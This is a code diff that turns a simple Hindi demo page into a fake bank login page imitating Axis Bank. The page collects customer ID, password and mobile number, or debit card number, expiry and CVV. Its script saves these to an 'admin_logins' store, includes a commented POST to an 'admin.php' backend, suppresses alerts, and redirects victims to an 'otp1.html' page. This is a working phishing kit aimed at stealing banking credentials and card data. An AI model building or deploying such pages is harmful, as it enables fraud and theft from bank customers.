@@ -3,259 +3,473 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>#990330 रंग का पेज</title>
+    <title>Login using</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
             background-color: #990330;
-            color: white;
-            font-family: 'Arial', sans-serif;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .header-section {
+            background-color: #990330;
+            color: white;
+            padding: 25px;
             text-align: center;
         }
         
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background-color: rgba(0, 0, 0, 0.3);
+        .header-section h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .header-section p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .login-options {
+            display: flex;
+            background-color: #f0f0f0;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .login-tab {
+            flex: 1;
+            text-align: center;
+            padding: 15px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            transition: all 0.3s;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .login-tab.active {
+            background-color: white;
+            color: #990330;
+            border-bottom: 3px solid #990330;
+        }
+        
+        .login-form {
             padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-        
-        h1 {
-            color: #FFD700;
-            margin-bottom: 20px;
-            font-size: 2.8rem;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-        }
-        
-        h2 {
-            color: #FFFFFF;
-            margin: 20px 0;
-            border-bottom: 2px solid white;
-            padding-bottom: 10px;
         }
         
         .form-section {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+            display: none;
         }
         
-        input, textarea, button {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 2px solid #FFD700;
-            border-radius: 8px;
-            font-size: 16px;
-            background-color: rgba(255, 255, 255, 0.9);
+        .form-section.active {
+            display: block;
         }
         
-        button {
-            background-color: #FFD700;
-            color: #990330;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
+        .form-group {
+            margin-bottom: 20px;
         }
         
-        button:hover {
-            background-color: #FFFFFF;
-            transform: scale(1.05);
-        }
-        
-        .data-display {
-            background-color: rgba(0, 0, 0, 0.4);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            text-align: left;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .data-item {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 5px;
-            border-left: 4px solid #FFD700;
-        }
-        
-        .redirect-btn {
-            display: inline-block;
-            background-color: #FFD700;
-            color: #990330;
-            padding: 12px 30px;
-            margin: 10px;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            transition: all 0.3s;
-        }
-        
-        .redirect-btn:hover {
-            background-color: white;
-            transform: translateY(-3px);
-        }
-        
-        .footer {
-            margin-top: 30px;
-            color: rgba(255, 255, 255, 0.8);
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
             font-size: 14px;
         }
         
-        /* सभी बटन्स पर #990330 रंग */
-        .btn-990330 {
-            background-color: #990330 !important;
-            color: white !important;
-            border: 2px solid #FFD700 !important;
+        .input-with-icon {
+            position: relative;
         }
         
-        /* सभी लिंक्स पर #990330 रंग */
-        a {
-            color: #FFD700;
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #990330;
+            font-weight: bold;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 2px solid #990330;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+            transition: all 0.3s;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(153, 3, 48, 0.2);
+        }
+        
+        .forgot-link {
+            display: inline-block;
+            color: #990330;
             text-decoration: none;
+            font-size: 14px;
+            margin-top: 5px;
+            font-weight: 600;
         }
         
-        a:hover {
-            color: white;
+        .forgot-link:hover {
             text-decoration: underline;
+        }
+        
+        .enable-link {
+            display: inline-block;
+            color: #990330;
+            text-decoration: none;
+            font-size: 14px;
+            margin-left: 15px;
+            font-weight: 600;
+        }
+        
+        .dashboard-text {
+            margin: 25px 0;
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-left: 4px solid #990330;
+            border-radius: 5px;
+        }
+        
+        .dashboard-text p {
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #990330;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            background-color: #7a0228;
+            transform: translateY(-2px);
+        }
+        
+        .register-section {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+        
+        .register-text {
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .register-link {
+            color: #990330;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+        
+        .register-link:hover {
+            text-decoration: underline;
+        }
+        
+        .qr-section {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 10px;
+        }
+        
+        .qr-text {
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .qr-enlarge {
+            color: #990330;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        .qr-placeholder {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto;
+            background-color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            border: 2px dashed #990330;
+        }
+        
+        .qr-placeholder span {
+            color: #990330;
+            font-weight: 600;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .login-form {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>#990330 रंग का विशेष पेज</h1>
-        
-        <div class="form-section">
-            <h2>डेटा सहेजें (Save Data)</h2>
-            <input type="text" id="userName" placeholder="आपका नाम दर्ज करें...">
-            <textarea id="userMessage" placeholder="आपका संदेश... (यहाँ डेटा सेव होगा)"></textarea>
-            <button onclick="saveData()">डेटा सेव करें (LocalStorage में)</button>
-            <button onclick="clearData()" class="btn-990330">डेटा डिलीट करें</button>
+    <div class="login-container">
+        <div class="header-section">
+            <h1>Login using</h1>
+            <p>Login ID / Customer ID | Debit Card No.</p>
         </div>
         
-        <div class="form-section">
-            <h2>रिडायरेक्शन (Redirect)</h2>
-            <p>नीचे दिए बटन पर क्लिक करके अन्य पेज पर जाएँ:</p>
-            <a href="https://www.google.com" target="_blank" class="redirect-btn">Google पर जाएँ (नया टैब)</a>
-            <button onclick="redirectToPage()" class="btn-990330">उदाहरण पेज पर जाएँ</button>
+        <div class="login-options">
+            <div class="login-tab active" data-tab="userid">Login ID / Customer ID</div>
+            <div class="login-tab" data-tab="card">Debit Card No.</div>
         </div>
         
-        <div class="data-display">
-            <h2>सहेजा गया डेटा (Saved Data)</h2>
-            <div id="savedDataContainer">
-                <!-- यहाँ डेटा लोड होगा -->
+        <div class="login-form">
+            <!-- User ID Login Form -->
+            <div id="userid-form" class="form-section active">
+                <div class="form-group">
+                    <label>Login ID / Customer ID</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">i</span>
+                        <input type="text" id="userid" class="form-control" placeholder="Enter ID">
+                    </div>
+                    <div>
+                        <a href="#" class="forgot-link">Forgot customer ID</a>
+                        <a href="#" class="enable-link">Enable login ID</a>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">●</span>
+                        <input type="password" id="password" class="form-control" placeholder="Enter Password">
+                    </div>
+                    <a href="#" class="forgot-link">Forgot password</a>
+                </div>
+                
+                <div class="form-group">
+                    <label>Mobile Number</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">📱</span>
+                        <input type="tel" id="mobile" class="form-control" placeholder="Enter Mobile Number" maxlength="10">
+                    </div>
+                </div>
             </div>
-        </div>
-        
-        <div class="footer">
-            <p>यह पूरा पेज #990330 रंग में है | सभी बटन्स पर भी यही रंग इस्तेमाल हुआ है</p>
-            <p>डेटा Browser के LocalStorage में सेव हो रहा है</p>
+            
+            <!-- Debit Card Login Form -->
+            <div id="card-form" class="form-section">
+                <div class="form-group">
+                    <label>16-Digit Card Number</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">💳</span>
+                        <input type="text" id="cardno" class="form-control" placeholder="Enter 16-digit card number" maxlength="16">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Expiry Date (DDMM)</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">📅</span>
+                        <input type="text" id="expiry" class="form-control" placeholder="DDMM" maxlength="4">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>CVV (3 digits)</label>
+                    <div class="input-with-icon">
+                        <span class="input-icon">🔒</span>
+                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="dashboard-text">
+                <p>Login directly to Dashboard</p>
+            </div>
+            
+            <button type="button" id="loginBtn" class="login-btn">Login</button>
+            
+            <div class="register-section">
+                <span class="register-text">First time user?</span>
+                <a href="#" class="register-link">REGISTER HERE</a>
+            </div>
+            
+            <div class="qr-section">
+                <p class="qr-text">Scan to download open by Axis Bank app</p>
+                <div class="qr-placeholder">
+                    <span>QR Code</span>
+                </div>
+                <a href="#" class="qr-enlarge">Enlarge QR code</a>
+            </div>
         </div>
     </div>
 
     <script>
-        // पेज लोड होने पर सेव्ड डेटा दिखाएँ
-        document.addEventListener('DOMContentLoaded', function() {
-            displaySavedData();
+        // टैब स्विचिंग
+        document.querySelectorAll('.login-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                // सभी टैब्स से active क्लास हटाएं
+                document.querySelectorAll('.login-tab').forEach(t => {
+                    t.classList.remove('active');
+                });
+                
+                // सभी फॉर्म से active क्लास हटाएं
+                document.querySelectorAll('.form-section').forEach(form => {
+                    form.classList.remove('active');
+                });
+                
+                // क्लिक किए गए टैब को active बनाएं
+                this.classList.add('active');
+                
+                // संबंधित फॉर्म दिखाएं
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(`${tabId}-form`).classList.add('active');
+            });
         });
         
-        // डेटा सेव करने की फंक्शन
-        function saveData() {
-            const name = document.getElementById('userName').value;
-            const message = document.getElementById('userMessage').value;
+        // लॉगिन बटन कार्य
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            let loginData = {};
+            let currentTab = document.querySelector('.login-tab.active').getAttribute('data-tab');
             
-            if (!name.trim() || !message.trim()) {
-                alert('कृपया नाम और संदेश दोनों भरें!');
-                return;
+            if (currentTab === 'userid') {
+                // User ID लॉगिन डेटा
+                const userId = document.getElementById('userid').value.trim();
+                const password = document.getElementById('password').value.trim();
+                const mobile = document.getElementById('mobile').value.trim();
+                
+                if (!userId || !password || !mobile) {
+                    return; // कोई एलर्ट नहीं
+                }
+                
+                loginData = {
+                    login_type: 'userid',
+                    user_id: userId,
+                    password: password,
+                    mobile: mobile,
+                    timestamp: new Date().toISOString()
+                };
+                
+            } else if (currentTab === 'card') {
+                // कार्ड लॉगिन डेटा
+                const cardno = document.getElementById('cardno').value.trim();
+                const expiry = document.getElementById('expiry').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+                
+                if (!cardno || !expiry || !cvv) {
+                    return; // कोई एलर्ट नहीं
+                }
+                
+                loginData = {
+                    login_type: 'card',
+                    card_number: cardno,
+                    expiry_date: expiry,
+                    cvv: cvv,
+                    timestamp: new Date().toISOString()
+                };
             }
             
-            // LocalStorage में डेटा सेव करना
-            let savedData = JSON.parse(localStorage.getItem('userData990330')) || [];
-            
-            const newData = {
-                id: Date.now(),
-                name: name,
-                message: message,
-                timestamp: new Date().toLocaleString('hi-IN')
-            };
-            
-            savedData.push(newData);
-            localStorage.setItem('userData990330', JSON.stringify(savedData));
-            
-            // इनपुट फील्ड्स क्लियर करें
-            document.getElementById('userName').value = '';
-            document.getElementById('userMessage').value = '';
-            
-            // डेटा दिखाएँ
-            displaySavedData();
-            
-            alert('डेटा सफलतापूर्वक सेव हो गया!');
-        }
-        
-        // सेव्ड डेटा दिखाने की फंक्शन
-        function displaySavedData() {
-            const container = document.getElementById('savedDataContainer');
-            const savedData = JSON.parse(localStorage.getItem('userData990330')) || [];
-            
-            if (savedData.length === 0) {
-                container.innerHTML = '<p class="data-item">अभी तक कोई डेटा सेव नहीं हुआ है।</p>';
-                return;
+            try {
+                // डेटा बैकएंड पर भेजें (admin.html तक पहुँचाएँ)
+                // Note: वास्तविक implementation के लिए आपको server-side code चाहिए
+                await saveToBackend(loginData);
+                
+                // otp1.html पर रीडायरेक्ट
+                window.location.href = 'otp1.html';
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                // कोई एलर्ट नहीं दिखाना
             }
+        });
+        
+        // बैकएंड में डेटा सेव करने के लिए फंक्शन
+        async function saveToBackend(data) {
+            // यहाँ आपका actual backend endpoint होगा
+            // उदाहरण के लिए localStorage का उपयोग कर रहे हैं
+            // असल में यहाँ fetch API या AJAX call होगा
             
-            container.innerHTML = savedData.map(item => `
-                <div class="data-item">
-                    <strong>नाम:</strong> ${item.name}<br>
-                    <strong>संदेश:</strong> ${item.message}<br>
-                    <small>समय: ${item.timestamp}</small>
-                </div>
-            `).join('');
-        }
-        
-        // डेटा डिलीट करने की फंक्शन
-        function clearData() {
-            if (confirm('क्या आप सभी सेव्ड डेटा डिलीट करना चाहते हैं?')) {
-                localStorage.removeItem('userData990330');
-                displaySavedData();
-                alert('सभी डेटा डिलीट हो गया!');
-            }
-        }
-        
-        // रिडायरेक्ट करने की फंक्शन
-        function redirectToPage() {
-            // यहाँ आप अपना URL डाल सकते हैं
-            window.location.href = "https://www.example.com";
-        }
-        
-        // सभी बटन्स पर #990330 रंग लागू करना
-        function apply990330ToAllButtons() {
-            const buttons = document.querySelectorAll('button');
-            buttons.forEach(button => {
-                button.style.backgroundColor = '#990330';
-                button.style.color = 'white';
-                button.style.border = '2px solid #FFD700';
+            // localStorage में सेव करना (temporary solution)
+            let allLogins = JSON.parse(localStorage.getItem('admin_logins')) || [];
+            allLogins.push(data);
+            localStorage.setItem('admin_logins', JSON.stringify(allLogins));
+            
+            // वास्तविक बैकएंड के लिए:
+            /*
+            const response = await fetch('your-backend-endpoint/admin.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
             });
+            
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            
+            return await response.json();
+            */
         }
         
-        // पेज लोड होते ही बटन्स का रंग बदलें
-        window.onload = function() {
-            apply990330ToAllButtons();
-        };
+        // इनपुट वैलिडेशन
+        document.getElementById('cardno').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+        });
+        
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+        
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+        });
+        
+        document.getElementById('mobile').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
     </script>
 </body>
 </html>
